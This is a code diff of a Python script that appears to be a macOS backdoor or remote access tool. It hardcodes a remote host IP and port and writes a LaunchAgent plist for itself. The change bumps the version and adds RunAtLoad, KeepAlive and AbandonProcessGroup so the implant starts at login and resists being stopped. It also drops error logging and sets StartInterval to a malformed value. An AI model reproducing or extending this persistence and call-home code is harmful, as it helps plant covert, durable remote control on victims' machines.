@@ -19,7 +19,7 @@ try:
 except:
     from io import StringIO
 
-__version__ = "1.0"
+__version__ = "1.1"
 
 HOST = '50.159.66.236'
 PORT = 1708
@@ -601,9 +601,15 @@ STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                 '\t\t' + '<string>{python_path}</string>' + '\n'
                 '\t\t' + '<string>{script_path}</string>' + '\n'
                 '\t' + '</array>' + '\n'
-                '\t' + '<key>StandardErrorPath</key>' + '\n'
-                '\t' + '<string>/var/log/python_script.error</string>' + '\n'
+                # '\t' + '<key>StandardErrorPath</key>' + '\n'
+                # '\t' + '<string>/var/log/flylog.error</string>' + '\n'
+                '\t' + '<key>RunAtLoad</key>' + '\n'
+                '\t' + '<true/>' + '\n'
+                '\t' + '<key>StartInterval</key>' + '\n'
+                '\t' + '<true/>' + '\n'
                 '\t' + '<key>KeepAlive</key>' + '\n'
+                '\t' + '<true/>' + '\n'
+                '\t' + '<key>AbandonProcessGroup</key>' + '\n'
                 '\t' + '<true/>' + '\n'
                 '</dict>' + '\n'
                 '</plist>' + '\n')
